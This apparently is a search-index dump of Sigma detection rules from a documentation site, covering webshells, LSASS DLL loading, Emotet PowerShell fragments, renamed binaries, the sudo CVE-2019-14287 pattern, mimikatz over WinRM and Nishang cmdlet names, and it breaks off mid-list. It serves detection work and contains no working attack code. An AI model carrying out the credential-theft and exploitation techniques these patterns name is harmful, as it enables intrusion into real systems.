syscall: \u0026#39;execve\u0026#39; key: \u0026#39;detect_execve_www\u0026#39; condition: selection falsepositives: - Admin activity - Crazy web applications level: critical tags: - attack.persistence - attack.t1505.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_web_rce.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"Webshell Remote Command Execution"},{"categories":null,"contents":"Detects a method to load DLL via LSASS process using an undocumented Registry key\nKnown false-positives Unknown References https://blog.xpnsec.com/exploring-mimikatz-part-1/ https://twitter.com/SBousseaden/status/1183745981189427200 Raw rule (edit) title: DLL Load via LSASS id: b3503044-60ce-4bf4-bbcb-e3db98788823 status: test description: Detects a method to load DLL via LSASS process using an undocumented Registry key author: Florian Roth references: - https://blog.xpnsec.com/exploring-mimikatz-part-1/ - https://twitter.com/SBousseaden/status/1183745981189427200 date: 2019/10/16 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|contains: - \u0026#39;\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt\u0026#39; - \u0026#39;\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.persistence - attack.t1547.008 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_susp_lsass_dll_load.yml/","tags":["attack.execution","attack.persistence","attack.t1547.008"],"title":"DLL Load via LSASS"},{"categories":null,"contents":"Detects suspicious command line arguments of common data compression tools\nKnown false-positives unknown References https://twitter.com/SBousseaden/status/1184067445612535811 Raw rule (edit) title: Suspicious Compression Tool Parameters id: 27a72a60-7e5e-47b1-9d17-909c9abafdcd status: test description: Detects suspicious command line arguments of common data compression tools author: Florian Roth, Samir Bousseaden references: - https://twitter.com/SBousseaden/status/1184067445612535811 date: 2019/10/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: OriginalFileName: - \u0026#39;7z*.exe\u0026#39; - \u0026#39;*rar.exe\u0026#39; - \u0026#39;*Command*Line*RAR*\u0026#39; CommandLine|contains: - \u0026#39; -p\u0026#39; - \u0026#39; -ta\u0026#39; - \u0026#39; -tb\u0026#39; - \u0026#39; -sdel\u0026#39; - \u0026#39; -dw\u0026#39; - \u0026#39; -hp\u0026#39; falsepositive: ParentImage|startswith: \u0026#39;C:\\Program\u0026#39; condition: selection and not falsepositive falsepositives: - unknown level: high tags: - attack.collection - attack.t1560.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_compression_params.yml/","tags":["attack.collection","attack.t1560.001"],"title":"Suspicious Compression Tool Parameters"},{"categories":null,"contents":"Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287\nKnown false-positives Unlikely References https://www.openwall.com/lists/oss-security/2019/10/14/1 https://access.redhat.com/security/cve/cve-2019-14287 https://twitter.com/matthieugarin/status/1183970598210412546 Raw rule (edit) title: Sudo Privilege Escalation CVE-2019-14287 id: f74107df-b6c6-4e80-bf00-4170b658162b status: experimental description: Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287 author: Florian Roth date: 2019/10/15 modified: 2021/09/14 references: - https://www.openwall.com/lists/oss-security/2019/10/14/1 - https://access.redhat.com/security/cve/cve-2019-14287 - https://twitter.com/matthieugarin/status/1183970598210412546 logsource: product: linux tags: - attack.privilege_escalation - attack.t1068 - attack.t1548.003 - cve.2019.14287 detection: selection_keywords: - \u0026#39;* -u#*\u0026#39; condition: selection_keywords falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_sudo_cve_2019_14287.yml/","tags":["attack.privilege_escalation","attack.t1068","attack.t1548.003","cve.2019.14287"],"title":"Sudo Privilege Escalation CVE-2019-14287"},{"categories":null,"contents":"Detects a code page switch in command line or batch scripts to a rare language\nKnown false-positives Administrative activity (adjust code pages according to your organisation\u0026rsquo;s region) References https://docs.microsoft.com/en-us/windows/win32/intl/code-page-identifiers https://twitter.com/cglyer/status/1183756892952248325 Raw rule (edit) title: Suspicious Code Page Switch id: c7942406-33dd-4377-a564-0f62db0593a3 status: test description: Detects a code page switch in command line or batch scripts to a rare language author: Florian Roth, Jonhnathan Ribeiro, oscd.community references: - https://docs.microsoft.com/en-us/windows/win32/intl/code-page-identifiers - https://twitter.com/cglyer/status/1183756892952248325 date: 2019/10/14 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\chcp.com\u0026#39; CommandLine|endswith: - \u0026#39; 936\u0026#39; # Chinese # - \u0026#39; 1256\u0026#39; # Arabic - \u0026#39; 1258\u0026#39; # Vietnamese # - \u0026#39; 855\u0026#39; # Russian # - \u0026#39; 866\u0026#39; # Russian # - \u0026#39; 864\u0026#39; # Arabic condition: selection fields: - ParentCommandLine falsepositives: - \u0026#34;Administrative activity (adjust code pages according to your organisation\u0026#39;s region)\u0026#34; level: medium tags: - attack.t1036 - attack.defense_evasion ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_codepage_switch.yml/","tags":["attack.t1036","attack.defense_evasion"],"title":"Suspicious Code Page Switch"},{"categories":null,"contents":"Detects the keyboard preload installation with a suspicious keyboard layout, e.g. Chinese, Iranian or Vietnamese layout load in user session on systems maintained by US staff only\nKnown false-positives Administrators or users that actually use the selected keyboard layouts (heavily depends on the organisation\u0026rsquo;s user base) References https://renenyffenegger.ch/notes/Windows/registry/tree/HKEY_CURRENT_USER/Keyboard-Layout/Preload/index https://github.com/SwiftOnSecurity/sysmon-config/pull/92/files Raw rule (edit) title: Suspicious Keyboard Layout Load id: 34aa0252-6039-40ff-951f-939fd6ce47d8 status: test description: Detects the keyboard preload installation with a suspicious keyboard layout, e.g. Chinese, Iranian or Vietnamese layout load in user session on systems maintained by US staff only author: Florian Roth references: - https://renenyffenegger.ch/notes/Windows/registry/tree/HKEY_CURRENT_USER/Keyboard-Layout/Preload/index - https://github.com/SwiftOnSecurity/sysmon-config/pull/92/files date: 2019/10/12 modified: 2022/01/13 logsource: category: registry_event product: windows definition: \u0026#39;Requirements: Sysmon config that monitors \\Keyboard Layout\\Preload subkey of the HKLU hives - see https://github.com/SwiftOnSecurity/sysmon-config/pull/92/files\u0026#39; detection: selection_registry: EventType: SetValue TargetObject|contains: - \u0026#39;\\Keyboard Layout\\Preload\\\u0026#39; - \u0026#39;\\Keyboard Layout\\Substitutes\\\u0026#39; Details|contains: - 00000429 # Persian (Iran) - 00050429 # Persian (Iran) - 0000042a # Vietnamese condition: selection_registry falsepositives: - \u0026#34;Administrators or users that actually use the selected keyboard layouts (heavily depends on the organisation\u0026#39;s user base)\u0026#34; level: medium tags: - attack.resource_development - attack.t1588.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_suspicious_keyboard_layout_load.yml/","tags":["attack.resource_development","attack.t1588.002"],"title":"Suspicious Keyboard Layout Load"},{"categories":null,"contents":"Detects a WMI backdoor in Exchange Transport Agents via WMI event filters\nKnown false-positives Unknown References https://twitter.com/cglyer/status/1182389676876980224 https://twitter.com/cglyer/status/1182391019633029120 Raw rule (edit) title: WMI Backdoor Exchange Transport Agent id: 797011dc-44f4-4e6f-9f10-a8ceefbe566b status: test description: Detects a WMI backdoor in Exchange Transport Agents via WMI event filters author: Florian Roth references: - https://twitter.com/cglyer/status/1182389676876980224 - https://twitter.com/cglyer/status/1182391019633029120 date: 2019/10/11 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\EdgeTransport.exe\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.persistence - attack.t1546.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_wmi_backdoor_exchange_transport_agent.yml/","tags":["attack.persistence","attack.t1546.003"],"title":"WMI Backdoor Exchange Transport Agent"},{"categories":null,"contents":"Detects all Emotet like process executions that are not covered by the more generic rules\nKnown false-positives Unlikely References https://app.any.run/tasks/e13ab713-64cf-4b23-ad93-6dceaa5429ac/ https://app.any.run/tasks/81f3c28c-c686-425d-8a2b-a98198d244e1/ https://app.any.run/tasks/97f875e8-0e08-4328-815f-055e971ba754/ https://app.any.run/tasks/84fc9b4a-ea2b-47b1-8aa6-9014402dfb56/ Raw rule (edit) title: Emotet Process Creation id: d02e8cf5-6099-48cf-9bfc-1eec2d0c7b18 status: test description: Detects all Emotet like process executions that are not covered by the more generic rules author: Florian Roth date: 2019/09/30 modified: 2021/11/29 tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027 references: - https://app.any.run/tasks/e13ab713-64cf-4b23-ad93-6dceaa5429ac/ - https://app.any.run/tasks/81f3c28c-c686-425d-8a2b-a98198d244e1/ - https://app.any.run/tasks/97f875e8-0e08-4328-815f-055e971ba754/ - https://app.any.run/tasks/84fc9b4a-ea2b-47b1-8aa6-9014402dfb56/ logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39; -e* PAA\u0026#39; - \u0026#39;JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ\u0026#39; # $env:userprofile - \u0026#39;QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA\u0026#39; # $env:userprofile - \u0026#39;kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA\u0026#39; # $env:userprofile - \u0026#39;IgAoACcAKgAnACkAOwAkA\u0026#39; # \u0026#34;(\u0026#39;*\u0026#39;);$ - \u0026#39;IAKAAnACoAJwApADsAJA\u0026#39; # \u0026#34;(\u0026#39;*\u0026#39;);$ - \u0026#39;iACgAJwAqACcAKQA7ACQA\u0026#39; # \u0026#34;(\u0026#39;*\u0026#39;);$ - \u0026#39;JABGAGwAeAByAGgAYwBmAGQ\u0026#39; - \u0026#39;PQAkAGUAbgB2ADoAdABlAG0AcAArACgA\u0026#39; # =$env:temp+( - \u0026#39;0AJABlAG4AdgA6AHQAZQBtAHAAKwAoA\u0026#39; # =$env:temp+( - \u0026#39;9ACQAZQBuAHYAOgB0AGUAbQBwACsAKA\u0026#39; # =$env:temp+( condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_emotet.yml/","tags":["attack.execution","attack.t1059.001","attack.defense_evasion","attack.t1027"],"title":"Emotet Process Creation"},{"categories":null,"contents":"Detects the malicious use of a control panel item\nKnown false-positives Unknown References https://attack.mitre.org/techniques/T1196/ https://ired.team/offensive-security/code-execution/code-execution-through-control-panel-add-ins Raw rule (edit) title: Control Panel Items id: 0ba863e6-def5-4e50-9cea-4dd8c7dc46a4 status: test description: Detects the malicious use of a control panel item author: Kyaw Min Thein, Furkan Caliskan (@caliskanfurkan_) references: - https://attack.mitre.org/techniques/T1196/ - https://ired.team/offensive-security/code-execution/code-execution-through-control-panel-add-ins date: 2020/06/22 modified: 2022/01/07 logsource: product: windows category: process_creation detection: selection1: CommandLine|endswith: \u0026#39;.cpl\u0026#39; filter: CommandLine|contains: - \u0026#39;\\System32\\\u0026#39; - \u0026#39;%System%\u0026#39; selection2: Image|endswith: \u0026#39;\\reg.exe\u0026#39; CommandLine|contains: \u0026#39;add\u0026#39; selection3: CommandLine|contains: - \u0026#39;CurrentVersion\\\\Control Panel\\\\CPLs\u0026#39; condition: (selection1 and not filter) or (selection2 and selection3) falsepositives: - Unknown level: critical tags: - attack.execution - attack.defense_evasion - attack.t1218.002 - attack.persistence - attack.t1546 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_control_panel_item.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1218.002","attack.persistence","attack.t1546"],"title":"Control Panel Items"},{"categories":null,"contents":"Detects the execution of a renamed PowerShell often used by attackers or malware\nKnown false-positives Unknown References https://twitter.com/christophetd/status/1164506034720952320 Raw rule (edit) title: Renamed PowerShell id: d178a2d7-129a-4ba4-8ee6-d6e1fecd5d20 status: test description: Detects the execution of a renamed PowerShell often used by attackers or malware references: - https://twitter.com/christophetd/status/1164506034720952320 author: Florian Roth, frack113 date: 2019/08/22 modified: 2021/07/03 tags: - car.2013-05-009 - attack.defense_evasion - attack.t1036.003 logsource: product: windows category: process_creation detection: selection: Description|startswith: - \u0026#39;Windows PowerShell\u0026#39; - \u0026#39;pwsh\u0026#39; Company: \u0026#39;Microsoft Corporation\u0026#39; filter: Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\powershell_ise.exe\u0026#39; - \u0026#39;\\pwsh.exe\u0026#39; condition: selection and not filter falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_renamed_powershell.yml/","tags":["car.2013-05-009","attack.defense_evasion","attack.t1036.003"],"title":"Renamed PowerShell"},{"categories":null,"contents":"This events that are generated when using the hacktool Ruler by Sensepost\nKnown false-positives Go utilities that use staaldraad awesome NTLM library References https://github.com/sensepost/ruler https://github.com/sensepost/ruler/issues/47 https://github.com/staaldraad/go-ntlm/blob/master/ntlm/ntlmv1.go#L427 https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4776 https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624 Raw rule (edit) title: Hacktool Ruler id: 24549159-ac1b-479c-8175-d42aea947cae description: This events that are generated when using the hacktool Ruler by Sensepost status: experimental author: Florian Roth date: 2017/05/31 modified: 2021/08/09 references: - https://github.com/sensepost/ruler - https://github.com/sensepost/ruler/issues/47 - https://github.com/staaldraad/go-ntlm/blob/master/ntlm/ntlmv1.go#L427 - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4776 - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624 tags: - attack.discovery - attack.execution - attack.t1087 - attack.t1114 - attack.t1059 - attack.t1550.002 logsource: product: windows service: security detection: selection1: EventID: 4776 Workstation: \u0026#39;RULER\u0026#39; selection2: EventID: - 4624 - 4625 WorkstationName: \u0026#39;RULER\u0026#39; condition: (1 of selection*) falsepositives: - Go utilities that use staaldraad awesome NTLM library level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_alert_ruler.yml/","tags":["attack.discovery","attack.execution","attack.t1087","attack.t1114","attack.t1059","attack.t1550.002"],"title":"Hacktool Ruler"},{"categories":null,"contents":"Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns\nKnown false-positives Unknown References https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html https://twitter.com/blackorbird/status/1140519090961825792 Raw rule (edit) title: Suspicious Double Extension id: 1cdd9a09-06c9-4769-99ff-626e2b3991b8 status: stable description: Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns author: Florian Roth (rule), @blu3_team (idea) references: - https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html - https://twitter.com/blackorbird/status/1140519090961825792 date: 2019/06/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;.doc.exe\u0026#39; - \u0026#39;.docx.exe\u0026#39; - \u0026#39;.xls.exe\u0026#39; - \u0026#39;.xlsx.exe\u0026#39; - \u0026#39;.ppt.exe\u0026#39; - \u0026#39;.pptx.exe\u0026#39; - \u0026#39;.rtf.exe\u0026#39; - \u0026#39;.pdf.exe\u0026#39; - \u0026#39;.txt.exe\u0026#39; - \u0026#39; .exe\u0026#39; - \u0026#39;______.exe\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1566.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_double_extension.yml/","tags":["attack.initial_access","attack.t1566.001"],"title":"Suspicious Double Extension"},{"categories":null,"contents":"Detects a suspicious child process of userinit\nKnown false-positives Administrative scripts References https://twitter.com/SBousseaden/status/1139811587760562176 Raw rule (edit) title: Suspicious Userinit Child Process id: b655a06a-31c0-477a-95c2-3726b83d649d status: experimental description: Detects a suspicious child process of userinit references: - https://twitter.com/SBousseaden/status/1139811587760562176 author: Florian Roth (rule), Samir Bousseaden (idea) date: 2019/06/17 modified: 2021/06/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\userinit.exe\u0026#39; filter1: CommandLine|contains: \u0026#39;\\netlogon\\\u0026#39; filter2: Image|endswith: \u0026#39;\\explorer.exe\u0026#39; condition: selection and not filter1 and not filter2 fields: - CommandLine - ParentCommandLine falsepositives: - Administrative scripts level: medium tags: - attack.defense_evasion - attack.t1055 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_userinit_child.yml/","tags":["attack.defense_evasion","attack.t1055"],"title":"Suspicious Userinit Child Process"},{"categories":null,"contents":"Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.\nKnown false-positives Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist References https://attack.mitre.org/techniques/T1036/ https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html Raw rule (edit) title: Highly Relevant Renamed Binary id: 0ba1da6d-b6ce-4366-828c-18826c9de23e status: test description: Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint. author: Matthew Green - @mgreen27, Florian Roth references: - https://attack.mitre.org/techniques/T1036/ - https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html - https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html date: 2019/06/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: OriginalFileName: - \u0026#39;powershell.exe\u0026#39; - \u0026#39;powershell_ise.exe\u0026#39; - \u0026#39;psexec.exe\u0026#39; - \u0026#39;psexec.c\u0026#39; # old versions of psexec (2016 seen) - \u0026#39;cscript.exe\u0026#39; - \u0026#39;wscript.exe\u0026#39; - \u0026#39;mshta.exe\u0026#39; - \u0026#39;regsvr32.exe\u0026#39; - \u0026#39;wmic.exe\u0026#39; - \u0026#39;certutil.exe\u0026#39; - \u0026#39;rundll32.exe\u0026#39; - \u0026#39;cmstp.exe\u0026#39; - \u0026#39;msiexec.exe\u0026#39; filter: Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\powershell_ise.exe\u0026#39; - \u0026#39;\\psexec.exe\u0026#39; - \u0026#39;\\psexec64.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\mshta.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; - \u0026#39;\\certutil.exe\u0026#39; - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\cmstp.exe\u0026#39; - \u0026#39;\\msiexec.exe\u0026#39; condition: selection and not filter falsepositives: - Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist level: high tags: - attack.defense_evasion - attack.t1036.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_renamed_binary_highly_relevant.yml/","tags":["attack.defense_evasion","attack.t1036.003"],"title":"Highly Relevant Renamed Binary"},{"categories":null,"contents":"Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.\nKnown false-positives Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist References https://attack.mitre.org/techniques/T1036/ https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html Raw rule (edit) title: Renamed Binary id: 36480ae1-a1cb-4eaa-a0d6-29801d7e9142 status: test description: Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint. author: Matthew Green - @mgreen27, Ecco, James Pemberton / @4A616D6573, oscd.community (improvements), Andreas Hunkeler (@Karneades) references: - https://attack.mitre.org/techniques/T1036/ - https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html - https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html date: 2019/06/15 modified: 2021/12/01 logsource: category: process_creation product: windows detection: selection: OriginalFileName: - \u0026#39;cmd.exe\u0026#39; - \u0026#39;CONHOST.EXE\u0026#39; - \u0026#39;powershell.exe\u0026#39; - \u0026#39;powershell_ise.exe\u0026#39; - \u0026#39;psexec.exe\u0026#39; - \u0026#39;psexec.c\u0026#39; # old versions of psexec (2016 seen) - \u0026#39;cscript.exe\u0026#39; - \u0026#39;wscript.exe\u0026#39; - \u0026#39;mshta.exe\u0026#39; - \u0026#39;regsvr32.exe\u0026#39; - \u0026#39;wmic.exe\u0026#39; - \u0026#39;certutil.exe\u0026#39; - \u0026#39;rundll32.exe\u0026#39; - \u0026#39;cmstp.exe\u0026#39; - \u0026#39;msiexec.exe\u0026#39; - \u0026#39;7z.exe\u0026#39; - \u0026#39;winrar.exe\u0026#39; - \u0026#39;wevtutil.exe\u0026#39; - \u0026#39;net.exe\u0026#39; - \u0026#39;net1.exe\u0026#39; - \u0026#39;netsh.exe\u0026#39; filter: Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\conhost.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\powershell_ise.exe\u0026#39; - \u0026#39;\\psexec.exe\u0026#39; - \u0026#39;\\psexec64.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\mshta.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; - \u0026#39;\\certutil.exe\u0026#39; - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\cmstp.exe\u0026#39; - \u0026#39;\\msiexec.exe\u0026#39; - \u0026#39;\\7z.exe\u0026#39; - \u0026#39;\\winrar.exe\u0026#39; - \u0026#39;\\wevtutil.exe\u0026#39; - \u0026#39;\\net.exe\u0026#39; - \u0026#39;\\net1.exe\u0026#39; - \u0026#39;\\netsh.exe\u0026#39; condition: selection and not filter falsepositives: - Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist level: medium tags: - attack.defense_evasion - attack.t1036.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_renamed_binary.yml/","tags":["attack.defense_evasion","attack.t1036.003"],"title":"Renamed Binary"},{"categories":null,"contents":"Detect suspicious error on protocol RDP, potential CVE-2019-0708\nKnown false-positives Bad connections or network interruptions References https://github.com/zerosum0x0/CVE-2019-0708 https://github.com/Ekultek/BlueKeep Raw rule (edit) title: Potential RDP Exploit CVE-2019-0708 id: aaa5b30d-f418-420b-83a0-299cb6024885 description: Detect suspicious error on protocol RDP, potential CVE-2019-0708 references: - https://github.com/zerosum0x0/CVE-2019-0708 - https://github.com/Ekultek/BlueKeep tags: - attack.lateral_movement - attack.t1210 - car.2013-07-002 status: experimental author: \u0026#39;Lionel PRAT, Christophe BROCAS, @atc_project (improvements)\u0026#39; date: 2019/05/24 modified: 2021/10/13 logsource: product: windows service: system detection: selection: EventID: - 56 - 50 Provider_Name: TermDD condition: selection falsepositives: - Bad connections or network interruptions level: medium # too many false positives ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_rdp_potential_cve_2019_0708.yml/","tags":["attack.lateral_movement","attack.t1210","car.2013-07-002"],"title":"Potential RDP Exploit CVE-2019-0708"},{"categories":null,"contents":"Detects Task Scheduler .job import arbitrary DACL write\\par\nKnown false-positives Unknown References https://github.com/SandboxEscaper/polarbearrepo/tree/master/bearlpe Raw rule (edit) title: Windows 10 Scheduled Task SandboxEscaper 0-day id: 931b6802-d6a6-4267-9ffa-526f57f22aaf status: test description: Detects Task Scheduler .job import arbitrary DACL write\\par author: Olaf Hartong references: - https://github.com/SandboxEscaper/polarbearrepo/tree/master/bearlpe date: 2019/05/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\schtasks.exe\u0026#39; CommandLine|contains|all: - \u0026#39;/change\u0026#39; - \u0026#39;/TN\u0026#39; - \u0026#39;/RU\u0026#39; - \u0026#39;/RP\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1053.005 - car.2013-08-001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_win10_sched_task_0day.yml/","tags":["attack.privilege_escalation","attack.t1053.005","car.2013-08-001"],"title":"Windows 10 Scheduled Task SandboxEscaper 0-day"},{"categories":null,"contents":"Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708)\nKnown false-positives Unknown References https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/ Raw rule (edit) title: Terminal Service Process Spawn id: 1012f107-b8f1-4271-af30-5aed2de89b39 status: test description: Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708) author: Florian Roth references: - https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/ date: 2019/05/22 modified: 2021/11/27 logsource: product: windows category: process_creation detection: selection: ParentCommandLine|contains|all: - \u0026#39;\\svchost.exe\u0026#39; - \u0026#39;termsvcs\u0026#39; filter: Image|endswith: \u0026#39;\\rdpclip.exe\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1190 - attack.lateral_movement - attack.t1210 - car.2013-07-002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_termserv_proc_spawn.yml/","tags":["attack.initial_access","attack.t1190","attack.lateral_movement","attack.t1210","car.2013-07-002"],"title":"Terminal Service Process Spawn"},{"categories":null,"contents":"Detects the execution of a renamed PsExec often used by attackers or malware\nKnown false-positives Software that illegaly integrates PsExec in a renamed form Administrators that have renamed PsExec and no one knows why References https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/megacortex-ransomware-spotted-attacking-enterprise-networks Raw rule (edit) title: Renamed PsExec id: a7a7e0e5-1d57-49df-9c58-9fe5bc0346a2 status: test description: Detects the execution of a renamed PsExec often used by attackers or malware author: Florian Roth references: - https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/megacortex-ransomware-spotted-attacking-enterprise-networks date: 2019/05/21 modified: 2021/11/27 logsource: product: windows category: process_creation detection: selection: Description: \u0026#39;Execute processes remotely\u0026#39; Product: \u0026#39;Sysinternals PsExec\u0026#39; filter: Image|endswith: - \u0026#39;\\PsExec.exe\u0026#39; - \u0026#39;\\PsExec64.exe\u0026#39; condition: selection and not filter falsepositives: - Software that illegaly integrates PsExec in a renamed form - Administrators that have renamed PsExec and no one knows why level: high tags: - car.2013-05-009 - attack.defense_evasion - attack.t1036.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_renamed_psexec.yml/","tags":["car.2013-05-009","attack.defense_evasion","attack.t1036.003"],"title":"Renamed PsExec"},{"categories":null,"contents":"Detects usage of mimikatz through WinRM protocol by monitoring access to lsass process by wsmprovhost.exe.\nKnown false-positives low References https://pentestlab.blog/2018/05/15/lateral-movement-winrm/ Raw rule (edit) title: Mimikatz through Windows Remote Management id: aa35a627-33fb-4d04-a165-d33b4afca3e8 description: Detects usage of mimikatz through WinRM protocol by monitoring access to lsass process by wsmprovhost.exe. references: - https://pentestlab.blog/2018/05/15/lateral-movement-winrm/ status: stable author: Patryk Prauze - ING Tech date: 2019/05/20 modified: 2021/06/21 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; SourceImage: \u0026#39;C:\\Windows\\system32\\wsmprovhost.exe\u0026#39; filter: GrantedAccess: \u0026#39;0x80000000\u0026#39; condition: selection and not filter tags: - attack.credential_access - attack.execution - attack.t1003.001 - attack.t1059.001 - attack.lateral_movement - attack.t1021.006 - attack.s0002 falsepositives: - low level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_mimikatz_trough_winrm.yml/","tags":["attack.credential_access","attack.execution","attack.t1003.001","attack.t1059.001","attack.lateral_movement","attack.t1021.006","attack.s0002"],"title":"Mimikatz through Windows Remote Management"},{"categories":null,"contents":"Detects Commandlet names and arguments from the Nishang exploitation framework\nKnown false-positives Penetration testing References https://github.com/samratashok/nishang Raw rule (edit) title: Malicious Nishang PowerShell Commandlets id: f772cee9-b7c2-4cb2-8f07-49870adc02e0 status: experimental description: Detects Commandlet names and arguments from the Nishang exploitation framework date: 2019/05/16 modified: 2021/10/16 references: - https://github.com/samratashok/nishang tags: - attack.execution - attack.t1059.001 author: Alec Costello logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: Nishang: ScriptBlockText|contains: - Add-ConstrainedDelegationBackdoor - Set-DCShadowPermissions - DNS_TXT_Pwnage - Execute-OnTime - HTTP-Backdoor - Set-RemotePSRemoting - Set-RemoteWMI - Invoke-AmsiBypass - Out-CHM - Out-HTA - Out-SCF - Out-SCT - Out-Shortcut - Out-WebQuery - Out-Word - Enable-Duplication - Remove-Update - Download-Execute-PS - Download_Execute - Execute-Command-MSSQL - Execute-DNSTXT-Code - Out-RundllCommand - Copy-VSS - FireBuster - FireListener - 